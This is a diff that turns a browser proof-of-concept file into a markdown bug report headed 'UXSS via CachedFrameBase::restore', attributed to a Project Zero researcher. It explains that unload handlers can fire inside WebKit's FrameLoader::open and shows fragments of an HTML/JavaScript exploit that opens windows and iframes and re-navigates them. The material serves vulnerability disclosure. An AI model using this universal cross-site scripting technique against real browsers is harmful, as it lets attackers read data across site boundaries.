@@ -1,3 +1,22 @@
+# UXSS via CachedFrameBase::restore
+
+### Reported by lokihardt@google.com, Mar 17 2017
+
+This is similar to the case https://bugs.chromium.org/p/project-zero/issues/detail?id=1151.
+But this time, javascript handlers may be fired in `FrameLoader::open`.
+
+```cpp
+void FrameLoader::open(CachedFrameBase& cachedFrame)
+{
+	...
+    clear(document, true, true, cachedFrame.isMainFrame()); <<--------- prepareForDestruction which fires unloads events is called.
+    ...
+}
+```
+
+PoC:
+
+```html
 <html>
 <body>
 Click anywhere...
@@ -13,7 +32,7 @@ function navigate(w, url) {
     a.click();
 }
 
-window.onfocus = () => {
+window.onclick = () => {
 	window.w = open('about:blank', 'w', 'width=500, height=500');
 
 	let i0 = w.document.body.appendChild(document.createElement('iframe'));
@@ -65,3 +84,4 @@ let it = setInterval(() => {
 </script>
 </body>
 </html>
+```
